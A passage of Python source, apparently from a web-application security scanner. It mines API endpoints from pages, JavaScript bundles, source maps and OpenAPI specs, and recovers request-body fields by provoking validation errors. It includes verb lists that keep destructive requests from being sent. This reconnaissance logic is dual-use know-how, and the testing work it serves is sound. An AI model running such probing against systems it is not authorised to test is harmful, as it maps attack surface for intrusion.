    _DYN_SEG_RE = re.compile(
        r'/(?:\d+|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})'
        r'(?:[/?]|$)', re.I)
    # Static-asset extensions that are never API endpoints (kept out even when a
    # path happens to contain a hint substring).
    _ASSET_EXT = ('.js', '.mjs', '.css', '.map', '.png', '.jpg', '.jpeg', '.gif',
                  '.svg', '.webp', '.ico', '.woff', '.woff2', '.ttf', '.eot',
                  '.mp4', '.webm', '.mp3', '.pdf', '.zip', '.wasm')
    # Query-string keys that, when they're the ONLY params, mark a URL as media
    # resizing or tracking rather than a real API (image optimizers, UTM tags).
    _NOISE_QS_KEYS = {'w', 'h', 'q', 'url', 'dpr', 'fit', 'auto', 'fm', 'blur',
                      'quality', 'width', 'height', 'format', 'v', 'ver',
                      'utm_source', 'utm_medium', 'utm_campaign', 'utm_term',
                      'utm_content', 'fbclid', 'gclid', 'ref', 'rel'}

    def _looks_like_endpoint(self, path: str, raw: str) -> bool:
        """Generic (non-product-specific) test for whether a URL/path is worth
        recording as an API/data endpoint. Framework/media/tracking plumbing
        (API_NOISE) is rejected up front so it never pollutes the graph."""
        rawlow = (raw or '').lower()
        if any(nz in rawlow for nz in API_NOISE):
            return False
        low = path.lower()
        if low.endswith(self._ASSET_EXT):
            return False
        if any(h in low for h in API_HINTS):
            return True
        # A query string with an actual parameter → a dynamic endpoint, but a bare
        # image-resize/tracking param set (?w=&q=, ?utm_*) is not an API.
        if '?' in raw and '=' in raw.split('?', 1)[1]:
            qs = raw.split('?', 1)[1].lower()
            keys = {kv.split('=', 1)[0] for kv in qs.split('&') if kv}
            if keys and keys <= self._NOISE_QS_KEYS:
                return False
            return True
        # A REST-style resource path with a numeric/UUID segment.
        if self._DYN_SEG_RE.search(low):
            return True
        return False

    # POST indicators near a mined URL: fetch/axios/jQuery .post, an explicit
    # method:"POST", or XHR .open("POST", …). Used to tag a JS-mined endpoint as
    # POST rather than assuming GET.
    _POST_HINT_RE = re.compile(
        r'\.post\s*\(|\$\.post|axios\.post|http\.post|'
        r'method\s*[:=]\s*["\']post["\']|type\s*[:=]\s*["\']post["\']|'
        r'\.open\s*\(\s*["\']post["\']', re.I)

    def _method_for(self, url, ctx) -> str:
        """Best-guess HTTP method for a mined endpoint: GraphQL is POST (C), and a
        POST call-site hint in the surrounding source marks it POST (B); otherwise
        GET. Never sends anything — this is a static read of the source."""
        low = url.lower()
        if ('/graphql' in low or '/graphiql' in low
                or low.rstrip('/').endswith('/gql')):
            return 'POST'
        if self._POST_HINT_RE.search(ctx or ''):
            return 'POST'
        return 'GET'

    # axios/fetch `baseURL: "/api/v1"` (and baseUrl / "base_url") written in app
    # source — the path the frontend prepends to every relative API call.
    _BASEURL_RE = re.compile(
        r'base[_]?[Uu]rl["\']?\s*[:=]\s*["\'](/[^"\']{1,60})["\']')
    # A versioned API root inside an observed URL path: '/api/v1/x' -> '/api/v1'.
    _VER_SEG_RE = re.compile(r'^(/.*?/v\d+)(?=/|$)', re.I)

    def _learn_api_base_literal(self, text):
        """Record any API base path declared in app source (axios/fetch baseURL).
        Root-relative only ('/api/v1'); dynamic, nothing hardcoded."""
        for m in self._BASEURL_RE.finditer(text or ''):
            base = '/' + m.group(1).strip('/')
            if len(base) > 1 and not base.startswith('//'):
                self.api_base_hints.add(base)

    def _learn_api_bases_from_observed(self, observed):
        """Infer the API base prefix from real same-host traffic: a versioned
        segment (/api/v1/…) in an observed request URL marks '/api/v1' as a base.
        Complements the source-declared baseURL so detection works even when the
        base isn't a literal in the bundle."""
        for o in observed or []:
            path = urlparse(o.get('url', '')).path or ''
            mm = self._VER_SEG_RE.match(path)
            if mm:
                self.api_base_hints.add(mm.group(1).lower())

    def _endpoints_from_text(self, text, base_url, domain, from_source=False) -> dict:
        """Regex API-looking URLs/paths out of HTML or JS source and return
        {url: method}. Keeps the ones that look like endpoints (hint keyword,
        query params, or a REST-style id segment) and are in scope, inferring the
        method from the surrounding source (B: .post()/method:POST, C: GraphQL).
        Over-capture is safe; guessed GET endpoints that return the HTML shell are
        dropped downstream, and POST endpoints are never auto-sent.

        from_source=True (JS bundles / source maps) also stashes root-relative
        paths so they can be re-emitted under the detected API base after the
        crawl — the frontend writes them relative to axios's baseURL, so a bare
        '/hosts/command/search' is really '/api/v1/hosts/command/search'."""
        out: dict = {}
        if not text:
            return out
        if from_source:
            self._learn_api_base_literal(text)
            self._collect_request_models(text)
        for m in re.finditer(
                r"""["'`](https?://[^"'`\s]+|/[^"'`\s<>]{1,256})["'`]""", text):
            # Decode HTML entities (&amp; → &) so attribute-sourced URLs are
            # well-formed rather than carrying a literal &amp; in the query.
            raw = _html.unescape(m.group(1))
            full = urljoin(base_url, raw)
            # Surface in-scope hosts embedded in a query param (image proxies,
            # redirectors) even when the wrapping URL itself isn't an endpoint.
            self._note_embedded_hosts(full)
            if not self._looks_like_endpoint(urlparse(raw).path or raw, raw):
                continue
            pu = urlparse(full)
            if pu.scheme in ('http', 'https') and self._host_in_scope(pu.netloc):
                self._note_subdomain(pu.netloc)
                url = pu._replace(fragment='').geturl()
                ctx = text[max(0, m.start() - 48): m.end() + 72]
                method = self._method_for(url, ctx)
                if out.get(url) != 'POST':
                    out[url] = method
                # Stash root-relative source paths for post-crawl base expansion
                # (POST wins over an assumed GET for the same path).
                if (from_source and raw.startswith('/')
                        and not raw.startswith('//') and pu.path):
                    rec = self._mined_rel.setdefault(
                        pu.path, {'method': method, 'params': {}})
                    if method == 'POST':
                        rec['method'] = 'POST'
        return out

    # ── OpenAPI / Swagger spec parsing (non-destructive body recovery) ─────
    # Placeholder by JSON-schema type, used to seed a request-body template the
    # user can edit/fuzz in the Repeater without anything being sent.
    _SCHEMA_PLACEHOLDER = {
        'string': '', 'integer': 0, 'number': 0, 'boolean': False,
        'array': [], 'object': {},
    }

    @staticmethod
    def _deref(spec: dict, node, seen=None):
        """Resolve a local JSON `$ref` ('#/components/schemas/Foo' or
        '#/definitions/Foo') against `spec`. Returns {} on external/cyclic/bad
        refs. Cycle-guarded so a self-referential schema can't loop forever."""
        seen = seen if seen is not None else set()
        hops = 0
        while isinstance(node, dict) and '$ref' in node and hops < 20:
            ref = node['$ref']
            if not isinstance(ref, str) or not ref.startswith('#/'):
                return {}
            if ref in seen:
                return {}
            seen.add(ref)
            cur = spec
            for part in ref[2:].split('/'):
                part = part.replace('~1', '/').replace('~0', '~')
                cur = cur.get(part) if isinstance(cur, dict) else None
                if cur is None:
                    return {}
            node = cur
            hops += 1
        return node if isinstance(node, dict) else {}

    @classmethod
    def _schema_template(cls, spec, schema, seen=None, depth=0):
        """Build a JSON-serialisable example object from a (possibly $ref'd)
        OpenAPI/Swagger schema: an object's properties become keys with
        type-appropriate placeholder values. Bounded depth; tolerant of partial
        schemas."""
        seen = seen if seen is not None else set()
        schema = cls._deref(spec, schema, set(seen))
        if not isinstance(schema, dict) or depth > 4:
            return ''
        # Merge allOf compositions (common for inherited request models).
        if isinstance(schema.get('allOf'), list):
            merged = {'type': 'object', 'properties': {}}
            for part in schema['allOf']:
                p = cls._deref(spec, part, set(seen))
                if isinstance(p.get('properties'), dict):
                    merged['properties'].update(p['properties'])
            if merged['properties']:
                schema = merged
        for alt in ('oneOf', 'anyOf'):
            if isinstance(schema.get(alt), list) and schema[alt]:
                schema = cls._deref(spec, schema[alt][0], set(seen))
        props = schema.get('properties')
        if isinstance(props, dict):
            out = {}
            for name, sub in props.items():
                out[name] = cls._schema_template(spec, sub, seen, depth + 1)
            return out
        t = schema.get('type')
        if t == 'array':
            item = cls._schema_template(spec, schema.get('items', {}),
                                        seen, depth + 1)
            return [item] if item not in ('', None, {}) else []
        if 'example' in schema:
            return schema['example']
        if isinstance(schema.get('enum'), list) and schema['enum']:
            return schema['enum'][0]
        return cls._SCHEMA_PLACEHOLDER.get(t, '')

    @staticmethod
    def _spec_base_url(spec: dict, spec_url: str) -> str:
        """Resolve the base URL endpoint paths are relative to: OpenAPI 3
        `servers[0].url`, or Swagger 2 `schemes`+`host`+`basePath`, falling back
        to the spec document's own origin."""
        pu = urlparse(spec_url)
        origin = f'{pu.scheme or "https"}://{pu.netloc}'
        servers = spec.get('servers')
        if isinstance(servers, list) and servers and isinstance(servers[0], dict):
            u = (servers[0].get('url') or '').strip()
            if u.startswith(('http://', 'https://')):
                return u.rstrip('/')
            if u:
                return origin.rstrip('/') + '/' + u.strip('/')
        host = (spec.get('host') or '').strip()
        base = (spec.get('basePath') or '').strip()
        if host:
            scheme = (spec.get('schemes') or [pu.scheme or 'https'])[0]
            url = f'{scheme}://{host}'.rstrip('/')
            return url + ('/' + base.strip('/') if base else '')
        if base:
            return origin.rstrip('/') + '/' + base.strip('/')
        return origin

    def _parse_openapi_spec(self, spec_text, spec_url, domain) -> list:
        """Structurally parse an OpenAPI 3 / Swagger 2 document and return a list
        of endpoint records: {url, parent, method, params, body, ct}. For each
        operation it extracts the request-body schema (OpenAPI 3
        requestBody.content[json].schema, or Swagger 2 a `in:body` parameter)
        and turns it into a fuzzable param map + JSON template — recovering the
        POST body that URL-only mining misses, without sending anything."""
        try:
            spec = json.loads(spec_text)
        except Exception:
            return []
        if not isinstance(spec, dict):
            return []
        paths = spec.get('paths')
        if not isinstance(paths, dict):
            return []
        base = self._spec_base_url(spec, spec_url)
        out = []
        _METHODS = ('get', 'post', 'put', 'patch', 'delete')
        for path, ops in paths.items():
            if not isinstance(ops, dict):
                continue
            for method in _METHODS:
                op = ops.get(method)
                if not isinstance(op, dict):
                    continue
                template = ''
                # OpenAPI 3: requestBody.content['application/json'].schema
                rb = op.get('requestBody')
                if isinstance(rb, dict):
                    rb = self._deref(spec, rb)
                    content = rb.get('content') if isinstance(rb, dict) else None
                    if isinstance(content, dict):
                        mt = (content.get('application/json')
                              or next((v for k, v in content.items()
                                       if 'json' in k.lower()), None)
                              or next(iter(content.values()), None))
                        if isinstance(mt, dict) and mt.get('schema'):
                            template = self._schema_template(spec, mt['schema'])
                # Swagger 2: a parameter with in:body carries the schema.
                if template == '':
                    for p in (op.get('parameters') or []):
                        pd = self._deref(spec, p) if isinstance(p, dict) else {}
                        if pd.get('in') == 'body' and pd.get('schema'):
                            template = self._schema_template(spec, pd['schema'])
                            break
                params = (template if isinstance(template, dict) else {})
                body = json.dumps(template, ensure_ascii=False) if params else ''
                full = urljoin(base.rstrip('/') + '/', path.lstrip('/'))
                pu = urlparse(full)
                if pu.scheme not in ('http', 'https'):
                    continue
                if not self._host_in_scope(pu.netloc):
                    continue
                out.append({
                    'url': pu._replace(fragment='').geturl(),
                    'parent': spec_url, 'method': method.upper(),
                    'params': params, 'body': body,
                    'ct': 'application/json' if params else '',
                })
        return out

    # ── Source-map mining (non-destructive body/endpoint recovery) ────────
    # Per-scan cap on .map fetches and the bytes mined from each.
    _MAX_SOURCEMAPS = 40
    _MAP_BODY_CAP = 4_000_000
    _SOURCEMAP_RE = re.compile(r"""[#@]\s*sourceMappingURL=([^\s'"]+)""")
    # `.post('/url', …)` — the body arg may be an inline object OR a variable
    # (resolved by tracing its definition). Matches up to the start of the 2nd arg.
    _POST_CALL_RE = re.compile(
        r"""\.post\s*\(\s*[`'"]([^`'"]+)[`'"]\s*,\s*""", re.I)
    _OBJ_KEY_RE = re.compile(r"""[{,]\s*[`'"]?([A-Za-z_$][\w$]*)[`'"]?\s*:""")
    # Wrapper calls/identifiers around a body arg that aren't the model variable
    # (e.g. toRaw(form) / unref(x) / JSON.parse(...)) — skipped when picking the
    # identifier to trace.
    _ARG_SKIP = frozenset((
        'toRaw', 'unref', 'ref', 'reactive', 'shallowRef', 'shallowReactive',
        'toRefs', 'cloneDeep', 'clone', 'JSON', 'parse', 'stringify', 'Object',
        'assign', 'structuredClone', 'this', 'self', 'window', 'data',
        'undefined', 'null', 'true', 'false',
    ))

    @classmethod
    def _flat_keys(cls, obj: str) -> set:
        """Top-level keys of a `{…}` object-literal string, ignoring keys nested
        inside child objects/arrays (so `{page,filter:{a,b}}` → {page, filter},
        not {page, filter, a, b})."""
        inner = obj.strip()
        if inner.startswith('{'):
            inner = inner[1:]
        if inner.endswith('}'):
            inner = inner[:-1]
        prev = None
        while prev != inner:              # collapse nested {…}/[…] to a scalar
            prev = inner
            inner = re.sub(r'\{[^{}]*\}', '0', inner)
            inner = re.sub(r'\[[^\[\]]*\]', '0', inner)
        return set(cls._OBJ_KEY_RE.findall('{' + inner))

    @staticmethod
    def _balanced_braces(text, open_idx, cap=4000):
        """Return the {…}-balanced substring starting at `open_idx` (a '{'),
        ignoring braces inside strings. Bounded by `cap` chars."""
        depth, instr, esc = 0, '', False
        end = min(len(text), open_idx + cap)
        for i in range(open_idx, end):
            c = text[i]
            if instr:
                if esc:
                    esc = False
                elif c == '\\':
                    esc = True
                elif c == instr:
                    instr = ''
                continue
            if c in '"\'`':
                instr = c
            elif c == '{':
                depth += 1
            elif c == '}':
                depth -= 1
                if depth == 0:
                    return text[open_idx:i + 1]
        return ''

    def _resolve_var_keys(self, text, ident, near=0, _depth=0) -> set:
        """Trace a body-variable to its object definition and return its field
        names. Resolves `IDENT = {…}` / `const|let|var IDENT = reactive({…})` /
        `IDENT.value = {…}` (and one level of `...spread` composition), picking the
        definition nearest the call site. A short (1–2 char) name is traced only
        when it has a single, unambiguous definition — so a reused minified var
        (e.g. `s`) can't union unrelated objects. Static read — nothing is sent."""
        if _depth > 2 or not ident or ident in self._ARG_SKIP or ident[0].isdigit():
            return set()
        pat = re.compile(
            r'\b' + re.escape(ident) + r'(?:\.value)?\s*=\s*'
            r'(?:reactive|shallowReactive|ref|shallowRef|toRefs|observable|'
            r'computed)?\s*\(?\s*\{')
        matches = list(pat.finditer(text))
        if not matches:
            return set()
        # Ambiguous short name with more than one definition → unsafe to trace.
        if len(ident) < 3 and len(matches) != 1:
            return set()
        best = min(matches, key=lambda m: abs(m.start() - near))
        obj = self._balanced_braces(text, best.end() - 1)
        if not obj:
            return set()
        keys = self._flat_keys(obj)
        for sp in re.findall(r'\.\.\.([A-Za-z_$][\w$]*)', obj):
            if sp != ident:
                keys |= self._resolve_var_keys(text, sp, best.start(), _depth + 1)
        return keys

    def _authed_get_text(self, url) -> str:
        """Plain authenticated GET returning the response text (bounded), reusing
        the browser cookies + the host's stored credential. Used to fetch source
        maps; returns '' on any non-200 / error."""
        if not REQUESTS_AVAILABLE:
            return ''
        target = urlparse(url)._replace(fragment='').geturl()
        sess = requests.Session()
        try:
            for c in self.driver.get_cookies():
                sess.cookies.set(c.get('name'), c.get('value'),
                                 domain=c.get('domain'), path=c.get('path', '/'))
        except Exception:
            pass
        headers = {'User-Agent': self._browser_ua(), 'Accept': '*/*'}
        ah, acookie = self._auth_mutations(self._auth_for(url))
        headers.update(ah)
        if acookie:
            headers['Cookie'] = acookie
        try:
            r = sess.get(target, headers=headers, timeout=15, verify=False,
                         allow_redirects=True)
            if r.status_code != 200:
                return ''
            return r.text[:self._MAP_BODY_CAP]
        except Exception:
            return ''

    def _fetch_source_map(self, js_url, js_body) -> str:
        """Recover a JS bundle's original source via its source map and return the
        concatenated `sourcesContent`. Looks for a `sourceMappingURL` comment
        (inline data: URI or relative path), falling back to `<bundle>.map`.
        Non-destructive (a GET); skipped in Stealth and bounded by
        _MAX_SOURCEMAPS per scan. Returns '' when there's no usable map."""
        if not REQUESTS_AVAILABLE or self.mode == 'Stealth' or not self.running:
            return ''
        if getattr(self, '_maps_left', None) is None:
            self._maps_left = self._MAX_SOURCEMAPS
        if self._maps_left <= 0:
            return ''
        ref = ''
        for m in self._SOURCEMAP_RE.finditer(js_body or ''):
            ref = m.group(1)               # keep the last occurrence
        ref = _html.unescape(ref).strip()
        self._maps_left -= 1
        raw = ''
        try:
            if ref.startswith('data:'):
                import base64
                b64 = ref.split(',', 1)[1] if ',' in ref else ''
                raw = base64.b64decode(b64).decode('utf-8', 'ignore')
            else:
                map_url = (urljoin(js_url, ref) if ref
                           else js_url.split('?', 1)[0] + '.map')
                raw = self._authed_get_text(map_url)
        except Exception:
            return ''
        try:
            data = json.loads(raw)
        except Exception:
            return ''
        srcs = data.get('sourcesContent') if isinstance(data, dict) else None
        if not isinstance(srcs, list):
            return ''
        out, total = [], 0
        for s in srcs:
            if not isinstance(s, str):
                continue
            out.append(s)
            total += len(s)
            if total >= self._MAP_BODY_CAP:
                break
        return '\n'.join(out)

    def _post_bodies_from_source(self, text, base_url, domain) -> dict:
        """Recover POST request-body field names from readable source. Handles both
        an inline object — `.post('/url', { a, b })` — and a variable —
        `.post('/url', searchInfo)` — by tracing the variable to its object
        definition (incl. `...spread` composition). Returns {url: {field names}}
        for in-scope URLs. Static read only — nothing is sent."""
        out: dict = {}
        if not text:
            return out
        for m in self._POST_CALL_RE.finditer(text):
            raw_url = m.group(1)
            if not (raw_url.startswith('/') or raw_url.startswith('http')):
                continue
            full = urljoin(base_url, raw_url)
            pu = urlparse(full)
            if pu.scheme not in ('http', 'https') or not self._host_in_scope(pu.netloc):
                continue
            i = m.end()
            while i < len(text) and text[i] in ' \t\r\n':
                i += 1
            keys = set()
            if i < len(text) and text[i] == '{':
                # Inline object literal — its keys, plus any spread-in variables.
                obj = self._balanced_braces(text, i)
                keys |= self._flat_keys(obj)
                for sp in re.findall(r'\.\.\.([A-Za-z_$][\w$]*)', obj):
                    keys |= self._resolve_var_keys(text, sp, i)
            else:
                # Variable / expression arg — trace each identifier to its object.
                arg = text[i:i + 160].split(')')[0].split(',')[0]
                for ident in re.findall(r'[A-Za-z_$][\w$]*', arg):
                    keys |= self._resolve_var_keys(text, ident, m.start())
            if keys:
                out.setdefault(pu._replace(fragment='').geturl(),
                               set()).update(keys)
        return out

    # Pagination key vocabularies used to recognise a "search/list request model"
    # object literal in source: a literal carrying one of each is almost certainly
    # a paginated request body, and its *other* keys are the endpoint's optional
    # fields (search term, orderBy/order, filters) that a validation error — which
    # only names *required* fields — never reveals.
    _PAGE_KEYS = frozenset(('page', 'pagenum', 'pageno', 'pageindex',
                            'pagenumber', 'current', 'currentpage', 'pg'))
    _SIZE_KEYS = frozenset(('pagesize', 'size', 'limit', 'perpage', 'rows',
                            'pagecount', 'count'))
    _OBJ_LITERAL_RE = re.compile(r'\{[^{}]{0,800}\}')

    def _collect_request_models(self, text):
        """Mine source for paginated request-model object literals — flat literals
        carrying a page-like AND a size-like key — and store their full key sets.
        These reveal the *optional* body fields (orderBy/order/filters) of a
        search/list endpoint that the server's required-field validation omits.
        Static read only; nothing is sent."""
        if not text:
            return
        for m in self._OBJ_LITERAL_RE.finditer(text):
            keys = set(self._OBJ_KEY_RE.findall(m.group(0)))
            if len(keys) < 3:
                continue
            kl = {k.lower() for k in keys}
            if (kl & self._PAGE_KEYS) and (kl & self._SIZE_KEYS):
                self._page_models.add(frozenset(keys))

    # Path tokens that mark a POST as too dangerous to auto-send, even with an
    # empty body — data loss, code execution or session/system impact. The empty
    # POST probe always skips these (DELETE method is skipped outright too).
    # READ verbs — Probe POST only ever *sends* a request whose path clearly
    # names a read/query operation. This is an allowlist (not a denylist) so an
    # unrecognised or mutating action is never sent — it stays seeded for the
    # Repeater. 1Panel's /hosts/command/search matches on 'search'.
    _READ_POST_PATH = frozenset((
        'search', 'query', 'list', 'get', 'fetch', 'load', 'find', 'filter',
        'page', 'paginate', 'detail', 'details', 'info', 'view', 'show', 'read',
        'count', 'check', 'status', 'exist', 'exists', 'lookup', 'preview',
        'report', 'stat', 'stats', 'statistic', 'statistics', 'summary', 'tree',
        'available', 'all', 'search-all', 'options',
    ))
    # Destructive / state-changing verbs — a second guard: even if a path also
    # contains a read word, these veto the send (e.g. /search/delete).
    _UNSAFE_POST_PATH = frozenset((
        'del', 'delete', 'remove', 'destroy', 'drop', 'purge', 'wipe', 'clear',
        'exec', 'execute', 'run', 'kill', 'stop', 'shutdown', 'reboot',
        'restart', 'reset', 'format', 'uninstall', 'install', 'logout',
        'logoff', 'signout', 'revoke', 'disable', 'deactivate', 'prune',
        'terminate', 'rollback', 'restore', 'upgrade', 'operate',
        'create', 'add', 'new', 'save', 'update', 'edit', 'modify', 'set',
        'enable', 'apply', 'import', 'upload', 'send', 'generate', 'start',
        'deploy', 'bind', 'unbind', 'recover', 'migrate', 'sync', 'renew',
        'issue', 'change', 'rename', 'move', 'copy', 'clone', 'init', 'login',
        # auth / credential side effects — never auto-probed (manual only), even
        # when a path also contains a read word (e.g. /forget-password).
        'signin', 'signup', 'register', 'password', 'passwd', 'pwd', 'forgot',
        'forget', 'verify', 'otp', 'token', 'auth', 'session', 'oauth',
    ))
    # Path tokens that make an auto-GET unsafe even though GET is *nominally* a
    # safe method: real apps wire session-kills, credential side effects and job
    # triggers to GET handlers. A discovered/inferred endpoint whose path names
    # one of these is surfaced as an un-sent node (fireable from the Repeater)
    # instead of being auto-requested. Tokenised + camelCase-aware via
    # _path_tokens, so '/api/logout' and '/api/runBackup' both match.
    _UNSAFE_GET_PATH = frozenset((
        # session / auth lifecycle — a GET here can kill the live session
        'logout', 'signout', 'logoff', 'revoke',
        # credential side effects (reset/verify emails, token rotation)
        'forgot', 'reset', 'verify', 'otp', 'refresh',
        # destructive / state-changing operations
        'delete', 'remove', 'destroy', 'drop', 'purge', 'wipe', 'clear',
        'exec', 'execute', 'run', 'kill', 'stop', 'shutdown', 'reboot',
        'restart', 'format', 'uninstall', 'install', 'terminate',
        'rollback', 'prune', 'deploy', 'disable',
        # job triggers that mutate state or are expensive to run
        'import', 'export', 'sync', 'migrate', 'backup', 'restore',
        'upgrade', 'generate', 'send',
    ))
    # Narrower set for navigation: <a href> targets a careful user would never
    # click (session-kills, explicit destructive actions). Job-noun pages
    # (Backup / Import / Export *views*) are intentionally NOT here — viewing
    # such a page is safe and we want to crawl into it; only the GET that
    # *performs* the action is withheld. Mirrors the DESTRUCTIVE label set.
    _DESTRUCTIVE_PATH = frozenset((
        'delete', 'remove', 'destroy', 'uninstall', 'kill', 'shutdown',
        'reboot', 'restart', 'reset', 'logout', 'logoff', 'signout',
        'drop', 'format', 'prune', 'disable', 'revoke', 'purge', 'wipe',
        'excluir', 'remover', 'apagar', 'sair', 'reiniciar',
    ))

    @staticmethod
    def _path_tokens(url) -> set:
        """Lowercased word tokens of a URL path, split on separators AND camelCase
        boundaries, so 'deleteHost' → {delete, host} and 'getUserList' → {get,
        user, list} are matched the same as '/delete/host'."""
        raw = urlparse(url).path or ''
        toks = set()
        for part in re.split(r'[/_\-.]+', raw):
            for w in re.findall(r'[A-Za-z][a-z]*|\d+', part):
                toks.add(w.lower())
        return toks

    @classmethod
    def _is_unsafe_post(cls, url, method) -> bool:
        """True if sending this could change state — a DELETE/PUT/PATCH, or a path
        naming a destructive/mutating action."""
        if (method or '').upper() in ('DELETE', 'PUT', 'PATCH'):
            return True
        return bool(cls._path_tokens(url) & cls._UNSAFE_POST_PATH)

    @classmethod
    def _is_read_post(cls, url) -> bool:
        """True if the path clearly names a read/query operation — the allowlist
        the default safe-path whitelist is derived from."""
        return bool(cls._path_tokens(url) & cls._READ_POST_PATH)

    @classmethod
    def _is_destructive_send(cls, url, method) -> bool:
        """True if auto-sending this would risk a state change: a DELETE, or a
        path naming a destructive / mutating / credential action. PUT/PATCH are
        allowed when the path is non-destructive (the whitelist still gates
        them). Such requests are surfaced un-sent for the Repeater."""
        if (method or '').upper() == 'DELETE':
            return True
        return bool(cls._path_tokens(url) & cls._UNSAFE_POST_PATH)

    @classmethod
    def _is_unsafe_get(cls, url) -> bool:
        """True if auto-GETting this path could have a side effect (session-kill,
        credential side effect, destructive / job-trigger op). Used to seed such
        an endpoint un-sent rather than requesting it — GET is only *nominally*
        safe; real apps execute these on GET."""
        return bool(cls._path_tokens(url) & cls._UNSAFE_GET_PATH)

    @classmethod
    def _is_destructive_link(cls, url) -> bool:
        """True if a linked <a href> names a destructive action a careful user
        wouldn't click (Logout / Delete / …). Such links are recorded but never
        navigated to."""
        return bool(cls._path_tokens(url) & cls._DESTRUCTIVE_PATH)

    @staticmethod
    def _seed_unsafe_get(node: SiteNode):
        """Mark a node as an un-sent GET candidate: its path names an action some
        apps wire to GET (session-kill / job-trigger / credential side effect),
        so we surface the endpoint but never auto-request it. Stays fireable from
        the Repeater."""
        node.req_method = node.req_method or 'GET'
        node.req_url = node.req_url or \
            urlparse(node.url)._replace(fragment='').geturl()
        node.probe_state = 'unsent'
        node.status_code = None
        node.resp_status = None
        node.resp_body = ('(GET endpoint whose path names a state-changing / '
                          'session action; not auto-sent to avoid a side effect '
                          '— edit and send it from the Repeater to test it.)')

    # Heuristic value for a recovered body field, by name. Pagination fields are
    # near-universal and have well-known shapes (page=1, size=10); everything else
    # is left blank for the user to fill. Generic — not tied to any one product.
    @staticmethod
    def _placeholder_for(field: str):
        low = re.sub(r'[_\-]', '', field.lower())
        if low in ('page', 'pagenum', 'pageno', 'pageindex', 'pagenumber',
                   'current', 'currentpage', 'pg', 'offset', 'start', 'from'):
            return 0 if low in ('offset', 'start', 'from') else 1
        if low in ('pagesize', 'size', 'limit', 'perpage', 'count', 'rows',
                   'pagecount', 'take', 'length', 'num', 'number'):
            return 10
        if 'page' in low and 'size' in low:
            return 10
        return ''

    # Go gin/validator text reports the *struct* field path (PascalCase, e.g.
    # "Key: 'Req.Page' Error:Field validation for 'Page' …"), so its names are
    # camelCased to the JSON key. Kept separate from the patterns below because
    # every other framework's message already names the real wire field — which
    # must be used verbatim (e.g. PascalCase-JSON .NET keys).
    _GO_VFIELD_PATTERNS = (
        r"validation for '([^']+)'",
        r"Key:\s*'([^']+)'\s+Error",
    )
    # Free-text patterns whose captured token is the real wire field name —
    # JSON-Schema/AJV, GraphQL and plain-English messages — used as-is.
    _VFIELD_PATTERNS = (
        r"required property '?\"?([A-Za-z_][\w]*)\"?'?",   # JSON-Schema / AJV
        r"Field '([A-Za-z_][\w]*)' of required type",      # GraphQL field
        r"[Aa]rgument \"?([A-Za-z_][\w]*)\"? of type [^ ]+ (?:was not|is required)",
        r"Variable \"\$([A-Za-z_][\w]*)\"[^.]*?(?:required|not provided)",  # GraphQL var
        r"['\"]?([A-Za-z_][\w]*)['\"]?\s+(?:is|are|field is)\s+"
        r"(?:required|missing|mandatory)",                 # "page is required"
    )

    @classmethod
    def _fields_from_validation(cls, body: str, status) -> list:
        """Recover required request-body field names from a server validation
        error — the empty-{} probe makes the server name what it wants. Generic
        across frameworks: Go gin/validator text, DRF/Laravel/ASP.NET `errors`
        maps, Spring/express-validator/AJV `errors` lists, FastAPI/Pydantic
        `detail[].loc`, GraphQL messages and plain `"X is required"` text. Returns
        [] when the response isn't an error, so real data is never misread. Field
        names come from the server — nothing hardcoded."""
        if not body:
            return []
        head = body[:6000]
        # In-body error code (e.g. 1Panel returns HTTP 200 with {"code":400,…}) or
        # HTTP 4xx or validation wording — otherwise this isn't an error response.
        looks_error = bool(
            (isinstance(status, int) and status >= 400)
            or re.search(r'"(?:code|status)"\s*:\s*4\d\d', head)
            or re.search(r'(required|validation|invalid|must be|must not|missing|'
                         r'cannot be blank|expected|not provided|mandatory)',
                         head, re.I))
        if not looks_error:
            return []
        fields, seen = [], set()
        msgs = []                       # free-text messages to scan with patterns

        def add(name, camel=False):
            n = str(name or '').strip()
            if camel:
                # Go validator only: 'Struct.Sub.Field' → leaf, first letter lowered
                # to guess the JSON key (Page → page). Other sources are verbatim,
                # so a genuinely PascalCase JSON field (.NET) is left intact.
                n = n.split('.')[-1]
                if n and n[0].isupper() and not n.isupper():
                    n = n[0].lower() + n[1:]
            if n and n not in seen and re.match(r'^[A-Za-z_]\w*$', n):
                seen.add(n)
                fields.append(n)

        # Structured JSON shapes (most precise — try first).
        try:
            data = json.loads(body)
        except Exception:
            data = None
        if isinstance(data, (dict, list)):
            containers = data if isinstance(data, list) else [data]
            for d in containers:
                if not isinstance(d, dict):
                    continue
                # FastAPI / Pydantic: detail=[{loc:[kind, field, …], msg:…}].
                det = d.get('detail')
                for e in (det if isinstance(det, list) else []):
                    if isinstance(e, dict):
                        loc_raw = e.get('loc')
                        loc = ([str(x) for x in loc_raw]
                               if isinstance(loc_raw, list) else [])
                        kinds = {'body', 'query', 'path', 'header', 'cookie'}
                        if loc and loc[0].lower() in kinds and len(loc) > 1:
                            add(loc[1])
                        elif loc:
                            add(loc[-1])
                        if e.get('msg'):
                            msgs.append(str(e['msg']))
                # errors: dict (DRF/Laravel/ASP.NET) or list (Spring/express/AJV).
                errs = d.get('errors')
                if isinstance(errs, dict):
                    for k in errs:
                        add(k)
                elif isinstance(errs, list):
                    for e in errs:
                        if isinstance(e, dict):
                            add(e.get('field') or e.get('param')
                                or e.get('name') or '')
                            for mk in ('message', 'msg', 'defaultMessage',
                                       'detail', 'description'):
                                if e.get(mk):
                                    msgs.append(str(e[mk]))
                        elif isinstance(e, str):
                            msgs.append(e)
                # DRF/Laravel top level {field: [msg], …}.
                meta = {'message', 'msg', 'code', 'data', 'status', 'error',
                        'errors', 'detail', 'success', 'type', 'title',
                        'timestamp', 'path', 'traceid'}
                for k, v in d.items():
                    if k.lower() not in meta and isinstance(v, (list, str)):
                        add(k)
                # Plain message strings → scanned with the free-text patterns.
                for mk in ('message', 'msg', 'detail', 'title', 'error',
                           'description'):
                    if isinstance(d.get(mk), str):
                        msgs.append(d[mk])
        # Free-text patterns over the gathered messages AND the raw head (covers
        # non-JSON bodies and any message the structured pass didn't reach). Go
        # validator names are camelCased; all others are taken verbatim.
        blob = ' '.join(msgs) + ' ' + head
        for pat in cls._GO_VFIELD_PATTERNS:
            for m in re.findall(pat, blob):
                add(m, camel=True)
        for pat in cls._VFIELD_PATTERNS:
            for m in re.findall(pat, blob, re.I):
                add(m)
        return fields

    @staticmethod
    def _encode_body(fields: dict, fmt: str):
